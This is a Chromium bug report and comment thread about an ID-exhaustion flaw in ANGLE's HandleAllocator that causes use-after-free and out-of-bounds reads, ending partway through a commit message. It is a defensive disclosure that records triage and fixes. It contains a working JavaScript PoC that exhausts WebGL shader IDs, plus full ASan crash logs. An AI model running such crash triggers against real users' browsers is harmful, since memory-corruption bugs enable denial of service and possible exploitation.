# ANGLE HandleAllocator: Invalid iterator access on empty vector → UAF + OOB (double-free plausible)

| Field | Value |
|-------|-------|
| **Issue ID** | [452209503](https://issues.chromium.org/issues/452209503) |
| **Status** | Accepted |
| **Severity** | S3-Low |
| **Priority** | P3 |
| **Component** | Internals>GPU>ANGLE |
| **Platforms** | Android, Linux, Mac, Windows, ChromeOS |
| **Reporter** | gl...@gmail.com |
| **Assignee** | ge...@chromium.org |
| **Created** | 2025-10-15 |
| **Bounty** | $1,000.00 |

## Description

### Reporter statement

I reported the same issue to Firefox(status: confirmed) because ANGLE’s HandleAllocator does not handle ID-exhaustion correctly. Since Chromium ships the same ANGLE code, I believe Chromium is affected as well. ()

### Why I believe Chromium/ANGLE is affected

Firefox and Chromium use the same ANGLE upstream sources for this component (the HandleAllocator implementation is identical or functionally equivalent at the affected site).

I couldn’t find handling for ID-exhaustion on the Chromium side either (same behavior at the allocator level)

### VULNERABILITY DETAILS

third\_party/angle/src/libANGLE/HandleAllocator.cpp (gl::HandleAllocator::allocate()) mishandles handle-exhaustion. After erasing the last HandleRange from mUnallocatedList, the very next allocation does:

First, when the ID is exhausted,

```
if (listIt->begin == listIt->end)
{
    mUnallocatedList.erase(listIt);
}

```

due to this code, mUnallocatedList becomes an invalid iterator, and the HandleRange object that was inside calls its destructor.

**The problem occurs when, after all IDs are exhausted, you create an object again to receive an ID.**
When you attempt another allocation after all IDs are exhausted,

```
auto listIt = mUnallocatedList.begin();

```

this again accesses an invalid iterator, and due to begin(), you once again obtain the HandleRange object whose destructor should already have been called. Since this HandleRange object did not initialize its begin and end values again,

```
if (listIt->begin == listIt->end)
{
    mUnallocatedList.erase(listIt);
}

```

this code causes one more erase. At this time, since the size of mUnallocatedList is 0, a problem also occurs in that erase. (In Firefox, when performing that erase, a 4-byte container overflow read occurred in the ASan log, and while attempting to read an inaccessible region, an unhandled exception occurred during debugging. In Firefox, I was able to check the ASan log and follow the debugging to the end, but I could not do so in Chromium. Please refer to the debugging video that will be attached later, and if you can let me know why I could not debug to the end and why the ASan log did not occur, it would be very helpful for submitting the ASan log in the future. I will continue to update the report and attach the ASan log later.)

### Environment

Debugger: Visual Studio 2022
Browser: Google Chrome 143.0.7473.0 (Developer Build) (64-bit)
OS Name: Microsoft Windows 11 Pro
OS Version: 10.0.26100 N/A build 26100
Precondition: Sufficient computer memory resources are required to create a UINTMAX number of shader objects

### Reproduction:

Since I do not have sufficient computer memory resources, I have manipulated the begin value as follows:
The original HandleAllocator constructor:

HandleAllocator::HandleAllocator() : mBaseValue(1), mNextValue(1), mLoggingEnabled(false)
{
mUnallocatedList.push\_back(HandleRange(1, std::numeric\_limits<GLuint>::max()));
}
was modified to:

HandleAllocator::HandleAllocator() : mBaseValue(1), mNextValue(1), mLoggingEnabled(false)
{
// EXPERIMENT: narrow free range to (2^32-1000 .. 2^32-1) for fast exhaustion

const GLuint kStart = std::numeric\_limits<GLuint>::max() - 1000u;
const GLuint kEnd = std::numeric\_limits<GLuint>::max();
mUnallocatedList.push\_back(HandleRange(kStart, kEnd));
}
Then, I entered the following code into the web browser's console:

### PoC

```
(() => {
let c = document.querySelector('#dbg-webgl-canvas');
if (!c) {
c = document.createElement('canvas');
c.id = 'dbg-webgl-canvas';
c.width = 4; c.height = 4;
document.body.appendChild(c);
}
window.gl = c.getContext('webgl2') || c.getContext('webgl');
console.log('gl ready:', gl ? (gl instanceof WebGL2RenderingContext ? 'WebGL2' : 'WebGL1') : 'FAILED');
})();

(() => {
if (!gl) { console.warn('run setup first'); return; }
const N = 2000; // Increase if necessary
window.__shaders = window.__shaders || [];
for (let i = 0; i < N; ++i) {
const type = (i & 1) ? gl.VERTEX_SHADER : gl.FRAGMENT_SHADER;
__shaders.push(gl.createShader(type));
}
console.log('created shaders:', __shaders.length);
})();

```

## Attachments

- [chrome_debug.mp4](attachments/chrome_debug.mp4) (video/mp4, 225.8 MB)
- [exception1.png](attachments/exception1.png) (image/png, 301.2 KB)
- [dcheck.webp](attachments/dcheck.webp) (image/webp, 359.6 KB)

## Timeline

### gl...@gmail.com (2025-10-15)

This is a debugging video using Visual Studio 2022.

### gl...@gmail.com (2025-10-15)

description of exception1.png
\_Count = 18446744073709551608 appears because, when computing the length of the range to copy, last - first became negative (-8), and that value was then converted to an unsigned 64-bit integer (like size\_t), which wraps. By C/C++ rules, converting a negative number to a larger unsigned type uses modular (two’s-complement) interpretation, so -8 becomes 2^64 - 8. That’s why you see the huge value 18446744073709551608 (0xFFFFFFFFFFFFFFF8).

last - first typically goes negative when the range is reversed (iterator inversion), or when an invalidated iterator is reused after a std::vector erase or a reallocation, breaking the relationship between the start and end pointers. With that enormous \_Count, calls like memmove or pointer arithmetic (Dest + \_Count) attempt to read or write far beyond the valid memory region, causing an Access Violation.

### el...@chromium.org (2025-10-15)

Security shepherd: Thanks for the report. This doesn't seem like it could possibly be exploitable, since a website would need to allocate 2\*\*32 handles first and I am sure it would run into some other resource limit (?). Nonetheless, maybe it's a correctness bug? Over to yelizaveta@ for triage :)

### li...@chromium.org (2025-10-15)

I think it is possible to get this crash without a resource limit because the ShaderProgramID struct that's returns is a struct that just contains a GLuint, so a machine would need ~16GB of memory if I did the math correctly.

It's hard for me to tell exactly how exploitable this is though, so I'll leave it at medium severity for now.

Reporter: can you check if you can share the ASAN log you got when testing this on Firefox? That could help me get a better sense of what was happening when the overflow read occurred.

It's worth having this logic use CheckedNumerics regardless, I just wanna get a better sense of what the severity should be.

### gl...@gmail.com (2025-10-16)

Here is the ASan log from Firefox.
If you need anything else, please let me know. I’ll provide as much information as I can.
Thank you. @li...@chromium.org (Will this mention work?)

==9184==ERROR: AddressSanitizer: container-overflow on address 0x1194f4f70790 at pc 0x7ffdc3a52d43 bp 0x0039f23f4b80 sp 0x0039f23f4bc8
READ of size 4 at 0x1194f4f70790 thread T0
#0 0x7ffdc3a52d42 in gl::HandleAllocator::allocate C:\mozilla-sourcee\firefox\gfx\angle\checkout\src\libANGLE\HandleAllocator.cpp:70
#1 0x7ffdc3b02bba in gl::ShaderProgramManager::createShader C:\mozilla-sourcee\firefox\gfx\angle\checkout\src\libANGLE\ResourceManager.cpp:164
#2 0x7ffdc3977af3 in gl::Context::createShader C:\mozilla-sourcee\firefox\gfx\angle\checkout\src\libANGLE\Context.cpp:956
#3 0x7ffdc3faacba in GL\_CreateShader C:\mozilla-sourcee\firefox\gfx\angle\checkout\src\libGLESv2\entry\_points\_gles\_2\_0\_autogen.cpp:764
#4 0x7ffda787dfa4 in mozilla::WebGLShader::WebGLShader C:\mozilla-sourcee\firefox\dom\canvas\WebGLShader.cpp:73
#5 0x7ffda77d54af in mozilla::WebGLContext::CreateShader C:\mozilla-sourcee\firefox\dom\canvas\WebGLContextGL.cpp:269
#6 0x7ffda76975bb in mozilla::HostWebGLContext::CreateShader C:\mozilla-sourcee\firefox\dom\canvas\HostWebGLContext.cpp:172
#7 0x7ffda770bf76 in mozilla::ClientWebGLContext::Run\_WithDestArgTypes<void (mozilla::HostWebGLContext::\*)(unsigned long long, unsigned int),unsigned long long,unsigned int> C:\mozilla-sourcee\firefox\dom\canvas\ClientWebGLContext.cpp:437
#8 0x7ffda762aaee in mozilla::ClientWebGLContext::CreateShader C:\mozilla-sourcee\firefox\dom\canvas\ClientWebGLContext.cpp:1485
#9 0x7ffda69a1619 in mozilla::dom::WebGL2RenderingContext\_Binding::createShader C:\mozilla-sourcee\firefox\obj-asan\dom\bindings\WebGL2RenderingContextBinding.cpp:11877
#10 0x7ffda742aefb in mozilla::dom::binding\_detail::GenericMethodmozilla::dom::binding\_detail::NormalThisPolicy,mozilla::dom::binding\_detail::ThrowExceptions C:\mozilla-sourcee\firefox\dom\bindings\BindingUtils.cpp:3308
#11 0x0148c8f5b427 (<unknown module>)

0x1194f4f70790 is located 0 bytes inside of 8-byte region [0x1194f4f70790,0x1194f4f70798)
allocated by thread T0 here:
#0 0x7ffdd0aaacbd in malloc /builds/worker/fetches/llvm-project/compiler-rt/lib/asan/asan\_malloc\_win.cpp:98
#1 0x7ffde3e2114d in moz\_xmalloc C:\mozilla-sourcee\firefox\memory\mozalloc\mozalloc.cpp:52
#2 0x7ffdc3a54f00 in std::vector<gl::HandleAllocator::HandleRange,std::allocatorgl::HandleAllocator::HandleRange >::\_Emplace\_reallocategl::HandleAllocator::HandleRange C:\Users\kitri.mozbuild\vs\VC\Tools\MSVC\14.39.33519\include\vector:829
#3 0x7ffdc3a520c6 in gl::HandleAllocator::HandleAllocator C:\mozilla-sourcee\firefox\gfx\angle\checkout\src\libANGLE\HandleAllocator.cpp:28
#4 0x7ffdc3b01f7a in gl::ShaderProgramManager::ShaderProgramManager C:\mozilla-sourcee\firefox\gfx\angle\checkout\src\libANGLE\ResourceManager.cpp:137
#5 0x7ffdc3b1f080 in gl::State::State C:\mozilla-sourcee\firefox\gfx\angle\checkout\src\libANGLE\State.cpp:432
#6 0x7ffdc3964294 in gl::Context::Context C:\mozilla-sourcee\firefox\gfx\angle\checkout\src\libANGLE\Context.cpp:509
#7 0x7ffdc39fede2 in egl::Display::createContext C:\mozilla-sourcee\firefox\gfx\angle\checkout\src\libANGLE\Display.cpp:1522
#8 0x7ffdc3f771d0 in egl::CreateContext C:\mozilla-sourcee\firefox\gfx\angle\checkout\src\libGLESv2\egl\_stubs.cpp:135
#9 0x7ffdc3f8551f in EGL\_CreateContext C:\mozilla-sourcee\firefox\gfx\angle\checkout\src\libGLESv2\entry\_points\_egl\_autogen.cpp:93
#10 0x7ffda39da4fa in mozilla::gl::GLContextEGL::CreateGLContext::<lambda\_0>::operator() C:\mozilla-sourcee\firefox\gfx\gl\GLContextProviderEGL.cpp:724
#11 0x7ffda39d4815 in mozilla::gl::GLContextEGL::CreateGLContext C:\mozilla-sourcee\firefox\gfx\gl\GLContextProviderEGL.cpp:731
#12 0x7ffda39dd45f in mozilla::gl::GLContextEGL::CreateWithoutSurface::<lambda\_0>::operator() C:\mozilla-sourcee\firefox\gfx\gl\GLContextProviderEGL.cpp:1195
#13 0x7ffda39de729 in mozilla::gl::GLContextProviderEGL::CreateHeadless C:\mozilla-sourcee\firefox\gfx\gl\GLContextProviderEGL.cpp:1253
#14 0x7ffda7777c93 in mozilla::WebGLContext::CreateAndInitGL C:\mozilla-sourcee\firefox\dom\canvas\WebGLContext.cpp:402
#15 0x7ffda7779e20 in mozilla::WebGLContext::Create C:\mozilla-sourcee\firefox\dom\canvas\WebGLContext.cpp:535
#16 0x7ffda7619191 in mozilla::ClientWebGLContext::CreateHostContext C:\mozilla-sourcee\firefox\dom\canvas\ClientWebGLContext.cpp:853
#17 0x7ffda761f901 in mozilla::ClientWebGLContext::SetDimensions C:\mozilla-sourcee\firefox\dom\canvas\ClientWebGLContext.cpp:825
#18 0x7ffda760c4e9 in mozilla::dom::CanvasRenderingContextHelper::UpdateContext C:\mozilla-sourcee\firefox\dom\canvas\CanvasRenderingContextHelper.cpp:260
#19 0x7ffda864d9e4 in mozilla::dom::HTMLCanvasElement::UpdateContext C:\mozilla-sourcee\firefox\dom\html\HTMLCanvasElement.cpp:557
#20 0x7ffda760bd57 in mozilla::dom::CanvasRenderingContextHelper::GetOrCreateContext C:\mozilla-sourcee\firefox\dom\canvas\CanvasRenderingContextHelper.cpp:204
#21 0x7ffda760b7f6 in mozilla::dom::CanvasRenderingContextHelper::GetOrCreateContext C:\mozilla-sourcee\firefox\dom\canvas\CanvasRenderingContextHelper.cpp:170
#22 0x7ffda86554bd in mozilla::dom::HTMLCanvasElement::GetContext C:\mozilla-sourcee\firefox\dom\html\HTMLCanvasElement.cpp:1161
#23 0x7ffda73d6d03 in mozilla::dom::HTMLCanvasElement\_Binding::getContext C:\mozilla-sourcee\firefox\obj-asan\dom\bindings\HTMLCanvasElementBinding.cpp:291
#24 0x7ffda742aefb in mozilla::dom::binding\_detail::GenericMethodmozilla::dom::binding\_detail::NormalThisPolicy,mozilla::dom::binding\_detail::ThrowExceptions C:\mozilla-sourcee\firefox\dom\bindings\BindingUtils.cpp:3308
#25 0x7ffdaf5e0ac2 in js::InternalCallOrConstruct C:\mozilla-sourcee\firefox\js\src\vm\Interpreter.cpp:586
#26 0x7ffdaf5f93f8 in js::Interpret C:\mozilla-sourcee\firefox\js\src\vm\Interpreter.cpp:3276
#27 0x7ffdaf5df88e in js::RunScript C:\mozilla-sourcee\firefox\js\src\vm\Interpreter.cpp:460

HINT: if you don't care about these errors you may set ASAN\_OPTIONS=detect\_container\_overflow=0.
If you suspect a false positive see also: <https://github.com/google/sanitizers/wiki/AddressSanitizerContainerOverflow>.
SUMMARY: AddressSanitizer: container-overflow C:\mozilla-sourcee\firefox\gfx\angle\checkout\src\libANGLE\HandleAllocator.cpp:70 in gl::HandleAllocator::allocate
Shadow bytes around the buggy address:
0x1194f4f70500: fa fa 00 fa fa fa 00 fa fa fa 00 fa fa fa 00 00
0x1194f4f70580: fa fa 04 fa fa fa 00 fa fa fa 00 00 fa fa 00 fa
0x1194f4f70600: fa fa 04 fa fa fa 00 fa fa fa 00 00 fa fa 04 fa
0x1194f4f70680: fa fa fd fa fa fa fd fa fa fa 02 fa fa fa 04 fa
0x1194f4f70700: fa fa 00 00 fa fa fd fd fa fa fd fa fa fa fd fd
=>0x1194f4f70780: fa fa[fc]fa fa fa 00 00 fa fa 00 fa fa fa 00 00
0x1194f4f70800: fa fa fd fd fa fa 04 fa fa fa fd fd fa fa fd fd
0x1194f4f70880: fa fa fd fd fa fa 00 00 fa fa fd fd fa fa fd fd
0x1194f4f70900: fa fa 00 fa fa fa fd fd fa fa fd fd fa fa 02 fa
0x1194f4f70980: fa fa fd fd fa fa 00 00 fa fa fd fa fa fa fd fd
0x1194f4f70a00: fa fa 04 fa fa fa fd fd fa fa fd fa fa fa fd fd
Shadow byte legend (one shadow byte represents 8 application bytes):
Addressable: 00
Partially addressable: 01 02 03 04 05 06 07
Heap left redzone: fa
Freed heap region: fd
Stack left redzone: f1
Stack mid redzone: f2
Stack right redzone: f3
Stack after return: f5
Stack use after scope: f8
Global redzone: f9
Global init order: f6
Poisoned by user: f7
Container overflow: fc
Array cookie: ac
Intra object redzone: bb
ASan internal: fe
Left alloca redzone: ca
Right alloca redzone: cb
==9184==ABORTING

kitri@DESKTOP-JTSSUCU /c/mozilla-sourcee/firefox
$

### gl...@gmail.com (2025-10-16)

same log but I used Markdown to make it easier to read.

```
==9184==ERROR: AddressSanitizer: container-overflow on address 0x1194f4f70790 at pc 0x7ffdc3a52d43 bp 0x0039f23f4b80 sp 0x0039f23f4bc8
READ of size 4 at 0x1194f4f70790 thread T0
#0 0x7ffdc3a52d42 in gl::HandleAllocator::allocate C:\mozilla-sourcee\firefox\gfx\angle\checkout\src\libANGLE\HandleAllocator.cpp:70
#1 0x7ffdc3b02bba in gl::ShaderProgramManager::createShader C:\mozilla-sourcee\firefox\gfx\angle\checkout\src\libANGLE\ResourceManager.cpp:164
#2 0x7ffdc3977af3 in gl::Context::createShader C:\mozilla-sourcee\firefox\gfx\angle\checkout\src\libANGLE\Context.cpp:956
#3 0x7ffdc3faacba in GL_CreateShader C:\mozilla-sourcee\firefox\gfx\angle\checkout\src\libGLESv2\entry_points_gles_2_0_autogen.cpp:764
#4 0x7ffda787dfa4 in mozilla::WebGLShader::WebGLShader C:\mozilla-sourcee\firefox\dom\canvas\WebGLShader.cpp:73
#5 0x7ffda77d54af in mozilla::WebGLContext::CreateShader C:\mozilla-sourcee\firefox\dom\canvas\WebGLContextGL.cpp:269
#6 0x7ffda76975bb in mozilla::HostWebGLContext::CreateShader C:\mozilla-sourcee\firefox\dom\canvas\HostWebGLContext.cpp:172
#7 0x7ffda770bf76 in mozilla::ClientWebGLContext::Run_WithDestArgTypes<void (mozilla::HostWebGLContext::*)(unsigned long long, unsigned int),unsigned long long,unsigned int> C:\mozilla-sourcee\firefox\dom\canvas\ClientWebGLContext.cpp:437
#8 0x7ffda762aaee in mozilla::ClientWebGLContext::CreateShader C:\mozilla-sourcee\firefox\dom\canvas\ClientWebGLContext.cpp:1485
#9 0x7ffda69a1619 in mozilla::dom::WebGL2RenderingContext_Binding::createShader C:\mozilla-sourcee\firefox\obj-asan\dom\bindings\WebGL2RenderingContextBinding.cpp:11877
#10 0x7ffda742aefb in mozilla::dom::binding_detail::GenericMethodmozilla::dom::binding_detail::NormalThisPolicy,mozilla::dom::binding_detail::ThrowExceptions C:\mozilla-sourcee\firefox\dom\bindings\BindingUtils.cpp:3308
#11 0x0148c8f5b427  (<unknown module>)

0x1194f4f70790 is located 0 bytes inside of 8-byte region [0x1194f4f70790,0x1194f4f70798)
allocated by thread T0 here:
#0 0x7ffdd0aaacbd in malloc /builds/worker/fetches/llvm-project/compiler-rt/lib/asan/asan_malloc_win.cpp:98
#1 0x7ffde3e2114d in moz_xmalloc C:\mozilla-sourcee\firefox\memory\mozalloc\mozalloc.cpp:52
#2 0x7ffdc3a54f00 in std::vector<gl::HandleAllocator::HandleRange,std::allocatorgl::HandleAllocator::HandleRange >::_Emplace_reallocategl::HandleAllocator::HandleRange C:\Users\kitri\.mozbuild\vs\VC\Tools\MSVC\14.39.33519\include\vector:829
#3 0x7ffdc3a520c6 in gl::HandleAllocator::HandleAllocator C:\mozilla-sourcee\firefox\gfx\angle\checkout\src\libANGLE\HandleAllocator.cpp:28
#4 0x7ffdc3b01f7a in gl::ShaderProgramManager::ShaderProgramManager C:\mozilla-sourcee\firefox\gfx\angle\checkout\src\libANGLE\ResourceManager.cpp:137
#5 0x7ffdc3b1f080 in gl::State::State C:\mozilla-sourcee\firefox\gfx\angle\checkout\src\libANGLE\State.cpp:432
#6 0x7ffdc3964294 in gl::Context::Context C:\mozilla-sourcee\firefox\gfx\angle\checkout\src\libANGLE\Context.cpp:509
#7 0x7ffdc39fede2 in egl::Display::createContext C:\mozilla-sourcee\firefox\gfx\angle\checkout\src\libANGLE\Display.cpp:1522
#8 0x7ffdc3f771d0 in egl::CreateContext C:\mozilla-sourcee\firefox\gfx\angle\checkout\src\libGLESv2\egl_stubs.cpp:135
#9 0x7ffdc3f8551f in EGL_CreateContext C:\mozilla-sourcee\firefox\gfx\angle\checkout\src\libGLESv2\entry_points_egl_autogen.cpp:93
#10 0x7ffda39da4fa in mozilla::gl::GLContextEGL::CreateGLContext::<lambda_0>::operator() C:\mozilla-sourcee\firefox\gfx\gl\GLContextProviderEGL.cpp:724
#11 0x7ffda39d4815 in mozilla::gl::GLContextEGL::CreateGLContext C:\mozilla-sourcee\firefox\gfx\gl\GLContextProviderEGL.cpp:731
#12 0x7ffda39dd45f in mozilla::gl::GLContextEGL::CreateWithoutSurface::<lambda_0>::operator() C:\mozilla-sourcee\firefox\gfx\gl\GLContextProviderEGL.cpp:1195
#13 0x7ffda39de729 in mozilla::gl::GLContextProviderEGL::CreateHeadless C:\mozilla-sourcee\firefox\gfx\gl\GLContextProviderEGL.cpp:1253
#14 0x7ffda7777c93 in mozilla::WebGLContext::CreateAndInitGL C:\mozilla-sourcee\firefox\dom\canvas\WebGLContext.cpp:402
#15 0x7ffda7779e20 in mozilla::WebGLContext::Create C:\mozilla-sourcee\firefox\dom\canvas\WebGLContext.cpp:535
#16 0x7ffda7619191 in mozilla::ClientWebGLContext::CreateHostContext C:\mozilla-sourcee\firefox\dom\canvas\ClientWebGLContext.cpp:853
#17 0x7ffda761f901 in mozilla::ClientWebGLContext::SetDimensions C:\mozilla-sourcee\firefox\dom\canvas\ClientWebGLContext.cpp:825
#18 0x7ffda760c4e9 in mozilla::dom::CanvasRenderingContextHelper::UpdateContext C:\mozilla-sourcee\firefox\dom\canvas\CanvasRenderingContextHelper.cpp:260
#19 0x7ffda864d9e4 in mozilla::dom::HTMLCanvasElement::UpdateContext C:\mozilla-sourcee\firefox\dom\html\HTMLCanvasElement.cpp:557
#20 0x7ffda760bd57 in mozilla::dom::CanvasRenderingContextHelper::GetOrCreateContext C:\mozilla-sourcee\firefox\dom\canvas\CanvasRenderingContextHelper.cpp:204
#21 0x7ffda760b7f6 in mozilla::dom::CanvasRenderingContextHelper::GetOrCreateContext C:\mozilla-sourcee\firefox\dom\canvas\CanvasRenderingContextHelper.cpp:170
#22 0x7ffda86554bd in mozilla::dom::HTMLCanvasElement::GetContext C:\mozilla-sourcee\firefox\dom\html\HTMLCanvasElement.cpp:1161
#23 0x7ffda73d6d03 in mozilla::dom::HTMLCanvasElement_Binding::getContext C:\mozilla-sourcee\firefox\obj-asan\dom\bindings\HTMLCanvasElementBinding.cpp:291
#24 0x7ffda742aefb in mozilla::dom::binding_detail::GenericMethodmozilla::dom::binding_detail::NormalThisPolicy,mozilla::dom::binding_detail::ThrowExceptions C:\mozilla-sourcee\firefox\dom\bindings\BindingUtils.cpp:3308
#25 0x7ffdaf5e0ac2 in js::InternalCallOrConstruct C:\mozilla-sourcee\firefox\js\src\vm\Interpreter.cpp:586
#26 0x7ffdaf5f93f8 in js::Interpret C:\mozilla-sourcee\firefox\js\src\vm\Interpreter.cpp:3276
#27 0x7ffdaf5df88e in js::RunScript C:\mozilla-sourcee\firefox\js\src\vm\Interpreter.cpp:460

HINT: if you don't care about these errors you may set ASAN_OPTIONS=detect_container_overflow=0.
If you suspect a false positive see also: https://github.com/google/sanitizers/wiki/AddressSanitizerContainerOverflow.
SUMMARY: AddressSanitizer: container-overflow C:\mozilla-sourcee\firefox\gfx\angle\checkout\src\libANGLE\HandleAllocator.cpp:70 in gl::HandleAllocator::allocate
Shadow bytes around the buggy address:
0x1194f4f70500: fa fa 00 fa fa fa 00 fa fa fa 00 fa fa fa 00 00
0x1194f4f70580: fa fa 04 fa fa fa 00 fa fa fa 00 00 fa fa 00 fa
0x1194f4f70600: fa fa 04 fa fa fa 00 fa fa fa 00 00 fa fa 04 fa
0x1194f4f70680: fa fa fd fa fa fa fd fa fa fa 02 fa fa fa 04 fa
0x1194f4f70700: fa fa 00 00 fa fa fd fd fa fa fd fa fa fa fd fd
=>0x1194f4f70780: fa fa[fc]fa fa fa 00 00 fa fa 00 fa fa fa 00 00
0x1194f4f70800: fa fa fd fd fa fa 04 fa fa fa fd fd fa fa fd fd
0x1194f4f70880: fa fa fd fd fa fa 00 00 fa fa fd fd fa fa fd fd
0x1194f4f70900: fa fa 00 fa fa fa fd fd fa fa fd fd fa fa 02 fa
0x1194f4f70980: fa fa fd fd fa fa 00 00 fa fa fd fa fa fa fd fd
0x1194f4f70a00: fa fa 04 fa fa fa fd fd fa fa fd fa fa fa fd fd
Shadow byte legend (one shadow byte represents 8 application bytes):
Addressable:           00
Partially addressable: 01 02 03 04 05 06 07
Heap left redzone:       fa
Freed heap region:       fd
Stack left redzone:      f1
Stack mid redzone:       f2
Stack right redzone:     f3
Stack after return:      f5
Stack use after scope:   f8
Global redzone:          f9
Global init order:       f6
Poisoned by user:        f7
Container overflow:      fc
Array cookie:            ac
Intra object redzone:    bb
ASan internal:           fe
Left alloca redzone:     ca
Right alloca redzone:    cb
==9184==ABORTING

kitri@DESKTOP-JTSSUCU /c/mozilla-sourcee/firefox
$

```

### gl...@gmail.com (2025-10-16)

Additionally, while debugging with DCHECKs enabled, I hit the assertion DCHECK(service\_id != invalid\_service\_id()) in gpu/command\_buffer/service/client\_map.h. I’m attaching a screenshot of that as well in case it’s helpful.

### ch...@google.com (2025-10-22)

Setting milestone because of s2 severity.

### gl...@gmail.com (2025-10-22)

Hello,

We are university students conducting short-term security research focused on WebGL vulnerabilities in web browsers.
Thank you for your thorough review of our report, despite its quality limitations.

Apart from the vulnerability we reported, we have a few questions:

### Question 1: Security Implications of Duplicate ID Allocation

If duplicate IDs could be allocated, what security issues might arise? Specifically, we'd like to know if there have been past cases where attackers could:

1. Pass validation checks with a legitimate object
2. Then swap it with a malicious object for exploitation

Are there any known historical examples of such Time-of-Check to Time-of-Use (TOCTOU) attacks in WebGL or similar graphics APIs?

### Question 2: Handle Consolidation Logic

We found the following code in `HandleAllocator::release`:

```
void HandleAllocator::release(GLuint handle)
{
    if (mLoggingEnabled)
    {
        WARN() << "HandleAllocator::release releasing " << handle << std::endl;
    }
    // Try consolidating the ranges first.
    for (HandleRange &handleRange : mUnallocatedList)
    {
        if (handleRange.begin - 1 == handle)
        {
            handleRange.begin--;
            return;
        }
        if (handleRange.end == handle - 1)
        {
            handleRange.end++;
            return;
        }
    }
    // Add to released list, logarithmic time for push_heap.
    mReleasedList.push_back(handle);
    std::push_heap(mReleasedList.begin(), mReleasedList.end(), std::greater());
}

```

**Question:** Under normal ID allocation and deallocation scenarios, is it possible for the condition:

```
if (handleRange.end == handle - 1)
{
    handleRange.end++;
    return;
}

```

to be triggered?

If these questions are not suitable for this discussion, we would appreciate your feedback so we can learn and avoid similar mistakes going forward. Thank you very much for your time and guidance.

### ch...@google.com (2025-10-30)

liza: Uh oh! This issue still open and hasn't been updated in the last 14 days. This is a serious vulnerability, and we want to ensure that there's progress. Could you please leave an update with the current status and any potential blockers?

If you're not the right owner for this issue, could you please remove yourself as soon as possible or help us find the right one?

If the issue is fixed or you can't reproduce it, please close the bug. If you've started working on a fix, please set the status to Started.[internal debugging info: security\_nag\_check]

Thanks for your time! To disable nags, add Disable-Nags (case sensitive) to the Chromium Labels custom field.

### gl...@gmail.com (2025-10-31)

I assume you will address this properly once the pending code review is completed, but I tried applying the code currently shown as "Pending Code Changes" (<https://chromium-review.googlesource.com/c/angle/angle/+/7073913>
) and built ANGLE with it.

After building, I confirmed that the original UAF and OOB issues I reported still reproduce.

I also agree that in the handle-allocation path there is a potentially more serious issue coming from ID re-allocation / duplicate ID assignment than the one I initially reported. So the patch that tries to prevent ID overflow/underflow is definitely in the right direction.
However, since UAF and OOB are still possible with the current change, I wanted to leave this comment.

If you want a very lightweight safeguard, you could insert

```
ASSERT(!mUnallocatedList.empty() || !mReleasedList.empty());

```

right before allocating a handle, and make sure this check also runs in release builds.
Of course, you probably know this code much better than I do — please take it just as a suggestion.

### dx...@google.com (2025-10-31)

Project: angle/angle  

Branch:  main  

Author:  Liza Burakova [liza@chromium.org](mailto:liza@chromium.org)  

Link:    <https://chromium-review.googlesource.com/7073913>

Use CheckedNumerics in HandleAllocator

---


Expand for full commit details
```
     
    This change modifies HandleAllocator's allocate and release methods 
    to use CheckedNumerics to ensure that attempts to allocate more 
    handles than max GLuint or release more than min GLuint don't cause 
    over or underflows 
     
    Bug: chromium:452209503 
    Change-Id: Iee644460d795293e7d79959f411da1a0e163a0c0 
    Reviewed-on: https://chromium-review.googlesource.com/c/angle/angle/+/7073913 
    Commit-Queue: Liza Burakova <liza@chromium.org> 
    Reviewed-by: Shahbaz Youssefi <syoussefi@chromium.org>

```

---

Files:

- M `src/libANGLE/HandleAllocator.cpp`
- M `src/libANGLE/HandleAllocator_unittest.cpp`

---

Hash: [d2e49812d9680b7ea04454aff519bdad99c9f96c](https://chromiumdash.appspot.com/commit/d2e49812d9680b7ea04454aff519bdad99c9f96c)  

Date: Wed Oct 22 15:37:30 2025


---

### li...@chromium.org (2025-10-31)

Hello!

First, let me respond to [#comment10](https://issues.chromium.org/issues/452209503#comment10):
HandleAllocator is used in a couple places, notably in allocating shaders as your PoC demonstrates, and it's also used to create new images.

I did a quick search, and I didn't find any examples of TOCTOU attacks in webgl or webgpu for these types of handles specifically. I think the risk is relatively low for this type of attack as after a shader is created it's compiled and sent to a driver, so the odds of being able to modify a handle after compilation doesn't seem super high or worth the effort imho.

For question 2, yes I believe it is possible as handle's can be reserved, which adjusts the range [here](https://source.chromium.org/chromium/chromium/src/+/main:third_party/angle/src/libANGLE/HandleAllocator.cpp;l=170). Note that with the checked numerics the code should now hit a CHECK and crash if it tries to go out of bounds.

Re [#comment12](https://issues.chromium.org/issues/452209503#comment12):

Thanks for checking this! Just to confirm, you built this and compiled ANGLE with a chromium build, then ran that chromium build with your PoC and got the same crash? Or did you see a crash due to a CHECK? If you saw the latter that is now expected behavior.

### dx...@google.com (2025-11-01)

Project: angle/angle  

Branch:  main  

Author:  Yuxin Hu [yuxinhu@google.com](mailto:yuxinhu@google.com)  

Link:    <https://chromium-review.googlesource.com/7108461>

Fix chromium ios\_simulator compilation error

---


Expand for full commit details
```
     
    Bug: chromium:452209503 
    Change-Id: Ie941c0478d1bc04d5bd848c97819eb370d6f472a 
    Reviewed-on: https://chromium-review.googlesource.com/c/angle/angle/+/7108461 
    Commit-Queue: Yuxin Hu <yuxinhu@google.com> 
    Reviewed-by: Amirali Abdolrashidi <abdolrashidi@google.com>

```

---

Files:

- M `src/libANGLE/HandleAllocator_unittest.cpp`

---

Hash: [23d6a2de3046e1975fffd7f379c8cb72328fd5bb](https://chromiumdash.appspot.com/commit/23d6a2de3046e1975fffd7f379c8cb72328fd5bb)  

Date: Fri Oct 31 23:50:13 2025


---

### gl...@gmail.com (2025-11-01)

[#comment14](https://issues.chromium.org/issues/452209503#comment14)
After GLuint HandleAllocator::allocate() runs out of IDs and executes mUnallocatedList.erase(listIt);, the next time an ID is allocated it still refers to an invalidated iterator, so due to auto listIt = mUnallocatedList.begin(); it ends up reusing a HandleRange object whose destructor has already been called. It seems this issue still hasn’t been fixed.

### dx...@google.com (2025-11-01)

Project: angle/angle  

Branch:  main  

Author:  Yuxin Hu [yuxinhu@google.com](mailto:yuxinhu@google.com)  

Link:    <https://chromium-review.googlesource.com/7107892>

Temporarily remove the test that fails ios\_simulator compilation

---


Expand for full commit details
```
     
    Bug: chromium:452209503 
    Change-Id: I2c1c2fcee75c7021c3bdadd8fa40be867f0cd2f8 
    Reviewed-on: https://chromium-review.googlesource.com/c/angle/angle/+/7107892 
    Reviewed-by: Amirali Abdolrashidi <abdolrashidi@google.com> 
    Commit-Queue: Amirali Abdolrashidi <abdolrashidi@google.com> 
